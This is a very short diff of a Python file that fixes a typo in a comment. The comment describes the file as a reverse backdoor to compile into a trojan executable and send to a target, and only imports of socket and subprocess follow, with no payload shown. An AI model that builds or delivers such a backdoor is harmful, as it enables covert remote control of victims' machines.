@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-# Reverse backdoor fist compile it into a trajan executable file, and send to target
+# Reverse backdoor fist compile it into a trojan executable file, and send to target
 
 import socket
 import subprocess
